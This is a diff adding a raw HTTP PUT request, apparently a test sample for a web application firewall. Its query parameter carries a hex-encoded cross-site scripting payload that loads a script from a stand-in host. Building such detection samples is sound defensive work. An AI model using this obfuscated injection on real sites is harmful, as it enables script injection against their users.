@@ -1,0 +1,13 @@
+PUT /position?scalability=3c736372697074207372633d22687474703a2f2f746573742e746573742f223e3c2f7363726970743e HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G870A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
+Cookie: bandwidth=element; overview=mature; SESSIONID=69f342e982c0ebcf19da8f2aafb7ddec34061f918b445853fd87acc08d72e3b5f1085550f8868417d377783a749aafff
+
